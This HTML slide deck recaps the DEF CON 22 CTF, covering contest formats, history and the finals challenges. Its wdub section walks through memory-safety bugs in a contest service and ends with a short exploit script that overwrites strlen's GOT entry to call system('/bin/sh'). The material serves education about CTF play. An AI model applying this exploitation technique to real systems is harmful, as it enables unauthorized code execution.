<!doctype html>
<html lang="en">	
<head>
	<meta charset="utf-8">
	<title>DEF CON 22 CTF Wrapup</title>
	<link rel="stylesheet" href="css/reveal.min.css">
	<link rel="stylesheet" href="css/theme/moon.css" id="theme">	
</head>

<body>
	<div class="reveal">
		<div class="slides">

			<section id="title">
				<h1>DEF CON 22 CTF Recap</h1>
				<img src="images/title.jpg" />
			</section>

			<section id="author">
				<h1>Peter/Psifertex</h1>
				<ul>
					<li>We play CTFs</li>
					<li>Part of the team that runs <a href="http://ghostintheshellcode.com/">Ghost in the Shellcode</a> at ShmooCon</li>
				</ul>
			</section>

			<section "playalong">
				<h1>Play along!</h1>
				<p>We've created a mirror of the game to run here tonight, if you already know all about CTFs and just want to play with the challenges, see below. Note that eliza-v1 isn't running because it requires a custom patch to qemu-i386-user that isn't public yet.</p>
				<br />
				<h2>SSID: dc22ctf (no key)</h2>
				<h2>http://dc22ctf.local/</h2>
			</section>

			<section id="ctfoverview">
				
				<section id="ctfingeneral">
					<h1>CTFs In general</h1>
					<aside class="notes">Lots of popular styles, wargames, programming challenges, <a href="http://topcoder.com/">TopCoder</a>, etc. We're primarily focusing on three main types:</notes>
					<ol>
						<li>Red Team</li>
						<li>Blue Team</li>
						<li>Full Spectrum (sometimes called "Attack/Defense", or "A/D")</li>
				</section>

				<section id="redteam">
					<h1>Red Team</h1>
					<img src="images/red-team.png" />
				</section>

				<section id="redteamexamples")>
					<h1>Red Team</h1>
					<aside class="notes">Organizers of the game act as the defenders, setting up static challenges for the participants to try solving. These often look like Jeopardy style boards. DEF CON quals is an example of this type of event.</aside>
					<ul>
						<li>DEF CON Qualifiers</li>
						<li>Plaid CTF</li>
						<li>CODEGATE Qualifiers</li>
						<li>Ghost in the Shellcode</li>
					</ul>
				</section>

				<section id="blueteam">
					<h1>Blue Team</h1>
					<img src="images/blue-team.png" />
				</section>

				<section id="blueteamexamples">
					<h1>Blue Team</h1>
					<aside class="notes">The least-interesting challenges, these are more system administration exercises and involve the organizers (or an independent group from the organizers, but not official the participants) gettin to do all the offense, with the particpants defending their systems from attack.</aside>
					<ul>
						<li>CCDC</li>
						<li>CDX</li>
						<li>"Cyber Patriot" (which is apparently inspiring a similar event here in the UK)</li>
					</ul>
				</section>

				<section id="fullspectrum">
					<h1>Full Spectrum</h1>
					<img src="images/full-spectrum.png" />
				</section>

				<section id="fullspectrumexample">
					<h1>Full Spectrum</h1>
					<aside class="notes">My favorite, but also the hardest to set up and run. Particpants are both the defenders and the attackers at the same time. Requires far more team coordination, game-theory, and hair-pulling than any other format.</aside>
					<ul>
						<li>DEF CON CTF Finals</li>
						<li>CODEGATE Finals</li>
						<li>rwthCTF</li>
						<li>RuCTF Finals</li>
					</ul>
				</section>

			</section>

			<section id="highlights">
				<h1>DEF CON CTF Highlights</h1>
				<table>
					<thead style="font-weight: bold;">
						<td>YEAR</td>
						<td>DC</td>
						<td>CTF</td>
						<td>ORG</td>
						<td>NOTES</td>
					</thead>
					<tr>
						<td>1996</td>
						<td>4</td>
						<td>1</td>
						<td>DEF CON Staff</td>
						<td>First official CTF</td>
					</tr>
					<tr>
						<td>2004</td>
						<td>12</td>
						<td>9</td>
						<td>Ghetto Hackers</td>
						<td>Modern A/D Precursor</td>
					</tr>
					<tr>
						<td>2005</td>
						<td>13</td>
						<td>10</td>
						<td>Kenshoto</td>
						<td>First qualifier</td>
					</tr>
					<!--
					<tr>
						<td>2006</td>
						<td>14</td>
						<td>11</td>
						<td>Kenshoto</td>
						<td>Solaris, DTMF</td>
					</tr>
					<tr>
						<td>...</td>
						<td>...</td>
						<td>...</td>
						<td>...</td>
						<td>...</td>
					</tr>
					-->
					<tr>
						<td>2009</td>
						<td>17</td>
						<td>14</td>
						<td>DDTEK</td>
						<td>"New" Organizesr</td>
					</tr>
					<tr>
						<td>2013</td>
						<td>21</td>
						<td>17</td>
						<td>LegitBS</td>
						<td>New Organizers</td>
					</tr>
					<tr>
						<td>2014</td>
						<td>22</td>
						<td>18</td>
						<td>LegitBS</td>
						<td></td>
					</tr>
				</table>
			</section>

			<section id="thegame">
				<h1>The Game</h1>
				<img src="images/defcon-finals-2014.png">
			</section>

			<section id="theinterface">
				<h1>Game Interface</h1>
				<img src="images/gameinterface.png">
			</section>

			<section id="visaulization">
				<h1>Visualization</h1>
				<video class="stretch" data-autoplay src="images/captures.mp4"></video>
			</section>


			<section id="challenges">
				<h1>This Year's Challenges</h1>
				<ul>
					<li>badger (MSP430)</li>
					<li>justify (ARM)</li>
					<li>eliza (v1 i386,v2 ARM)</li>
					<li>imap (v1 ARM,v2 ARM)</li>
					<li>wdub (v1 ARM Thumb 2,v2 ARM Thumb 2)</li>
				</ul>
			</section>

			<section id="badger">

				<section id="badgerpic">
					<h1>badger</h1>
					<img src="images/badger.jpg">
				</section>

				<section id="badgerinfo">
					<h1>badger</h1>
					<ul>
						<li>XILINX Spartan 6 FPGA </li>
						<li>Running two OpenMSP430 cores</li>
						<li>One core handled the radio/management</li>
						<li>The other was the challenge logic</li>
						<li>Message passing service between badges</li>
				</section>

			</section>


			<section id="justify">
				<h1>justify</h1>
				<p class="fragment"><a href='https://google.com/search?q="p+cnf"'>https://google.com/search?q="p+cnf"</a></p>
				<pre><code class="stretch fragment" data-trim>
  c  sample-cnf-file.cnf
  c
  p cnf 3 2
  1 -3 0
  2 3 -1 0
				</code></pre>
				<p class="fragment">Tells us the format, would have saved a bunch of reversing. Known as "<a href="http://fairmut3x.wordpress.com/2011/07/29/cnf-conjunctive-normal-form-dimacs-format-explained/">Conjunctive Normal Form</a>".</p>
			</section>

			<section id="eliza">
				<h1>eliza</h1>
				<ul>
					<li>Tradewars-like game</li>
				</ul>
			</section>

			<section id="imap">
				<h1>imap</h1>
				<ul>
					<li>custom imap server, protocol shot fairly boring</li>
				</ul>
			</section>

			<section id="wdub">
				<section id="wdubv1">
					<h1>wdub v1</h1>
					<ul>
						<li>Supports basic HTTP verbs</li>
						<li>Integer overflow in x-offset HTTP header</li>
					</ul>
				</section>

				<section id="wdubv2">
					<h1>wdub v2</h1>
					<ul>
						<li>New HTTP Verb added: EVAL</li>
						<li>Supports "interesting" command-set</li>
					<pre><code data-trim>
Yo, nomo, gimme, exite, borit, bonut, dupme, makeit, bandit, mogain, slipitin,
slapitup, oudahere, putdatder, pobastard, datbettah, eatdatshit, screwdatshit,
splitdatshit, deyseemerollin, dayseemeshiftin
					</code></pre>
						<li>"like PHP"</li>
					</ul>
				</section>

				<section id="yodawg">
					<h1>YoDog</h1>
					<p>Simple syntax. Either:</p>
					<pre><code data-trim>
&lt;variable&gt; = &lt;command&gt; &lt;arg1&gt; … &lt;argN&gt;;
					</code></pre>
					<p>Or:</p>
					<pre><code data-trim>
&lt;command&gt; &lt;arg1&gt; … &lt;argN&gt;;
					</code></pre>
					<p>Where &lt;arg?&gt; is either a variable or a number</p>
				</section>

				<section id="yodawgsample">
					<h1>YoDawg Sample</h1>
					<pre><code data-trim>
foo = shebewalkinfunny 10;  //create the dword variable foo with value 10
bar = gimme 20;             //create a variable bar 20 bytes long
bonut bar 1;                //invert the byte at bar[1]
Yo bar;                     //print the contents of bar
</code></pre>
				</section>

				<section id="yodawgvuln1">
					<h1>YoDawg Vuln 1</h1>
					<h2>Oudahere - Information Disclosrue</h2>
					<ul>
						<li>Command removes a range of data from a buffer</li>
					</ul>
					<code>oudahere varbuf1 0 10;</code>
					<ul>
						<li>Removes first 10 bytes from varbuf1 starting at offset 0</li>
						<li>However there is an integer overflow allowing the read of arbitrary memory</li>
					</ul>
				</section>

				<section id="yodawgvuln2">
					<h1>YoDawg Vuln 2</h1>
					<h2>Dupme - Use-after-free</h2>
					<ul>
						<li>Supposed to duplicate a buffer but fails to do a deep copy</li>
						<li>This means two variables can point at the same data</li>
						<li>When the first is freed the second one points at freed data</li>
						<li>So if we have variables <code>a</code> and <code>bI</code>:</li>
						<ul>
							<li>allocate a</li>
							<li>duplicate a onto b (both a and b point to a's data)</li>
							<li>free a</li>
							<li>allocate c (now b's data is c's metadata)</li>
						</ul>
					</ul>
				</section>

				<section id="yodawgvuln3">
					<h1>YoDawg Vuln 3</h1>
					<h2>Putitin – Integer overflow</h2>
					<ul>
						<li>Writes a variable into an array</li>
						<li>Aray length validation is busted</li>
					</ul>
					<pre><code>
if (b-&gt;value + 4 &lt; c-&gt;size)
	memcpy(c-&gt;data[b-&gt;value], c-&gt;data, 4);
					</code></pre>
				</section>

				<section id="yodawgvuln4">
					<h1>YoDawg Vuln 4</h1>
					<h2>Bonut – Buffer overflow</h2>
					<ul>
						<li>bitwise inversion command</li>
						<li>Validates array index, but fails</li>
					</ul>
					<h3>Actual code</h3>
					<pre><code>
if (strlen(b-&gt;data) &lt; c-&gt;size)
	~c-&gt;data[atoi(b-&gt;data)];
					</code></pre>
					<h3>Correct code</h3>
					<pre><code>
if (<font color="red">atoi</font>(b-&gt;data) &lt; c-&gt;size)
	~c-&gt;data[atoi(b-&gt;data)];
					</code></pre>
				</section>

				<section id="whattodo">
					<h1>Pwn with a ~</h1>
					<ul>
						<li>Fortunately the bytes previous to my data is the length of my data</li>
						<li>Thus we bitwise invert the length  of my data we can make it much longer</li>
						<li>Giving us a variable whose data size spans all of memory</li>
						<li>Because no ASLR, no RELRO and we can read and write all of memory</li>
					</ul>
				</section>

				<section id="exploitation">
					<h1>Exploitation Plan</h1>
					<ul>
						<li>First we create an variable <code>A</code> whose data points at <code>strlen()</code></li>
						<li>Next we use an <code>eatdatshit</code> operation which subtracts a dword from a dword. </li>
						<ul>
							<li>We subtract the difference between <code>strlen()</code> and <code>system()</code></li>
							<li>Now the next thing that calls strlen will call <code>system()</code> instead</li>
						</ul>
						<li>Finally allocate a new variable called <code>/bin/sh</code></li>
						<ul>
							<li>This tries to do <code>strlen("/bin/sh")</code> but actually does <code>system("/bin/sh")</code></li>
							<li>Since this service is run via xinetd we drop to a shell</li>
						</ul>
					</ul>
				</section>

				<section id="exploitsample">
					<h1>Exploit</h1>
					<pre><code data-trim>
B = gimme 10;                 //record we will exploit
C = gimme 128;                //record we will write to the GOT with
bonut B -1;                   //invert they byte of our length 
D = shebewalkinfunny 106612;  //put the address of strlen GOT entry into D
putitin B D 192;              //write D into the pointer for C (an offset from B)
F = shebewalkinfunny 3;       //put 3 -&gt; F, this is type value for a dword
putitin B F 196;              //overwrite the type of C to be dword instead of string 
C = eatdatshit C 168689;      //subtract distance between strlen() and system() in GOT
/bin/sh = gimme 4;            //cause strlen() to be called
					</code></pre>
				</section>
			</section>

			<section id="results">
				<h1>Results</h1>
				<p><a href="https://legitbs.net/2014/">https://legitbs.net/2014/</a></p>
				<img src="images/LBS-wrapup.png">
			</section>

			<section id="questions">
				<h1>Questions?</h1>
				<p>Slides posted online: <a hef="http://twitter.com/psifertex">@psifertex</a></p>
			</section>

			</div>
	</div>
	<script src="lib/js/head.min.js"></script>
	<script src="js/reveal.min.js"></script>

	<script>
		Reveal.initialize({
			transition: 'none',
			transitionSpeed: 'hyper',
			slideNumber: true,
		    margin: 0.1,
			width: 1024,
			height: 768,

			/*
		    parallaxBackgroundImage: 'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg',
			parallaxBackgroundSize: '2100px 900px'
			*/

		});
	</script>
</body>
</html>
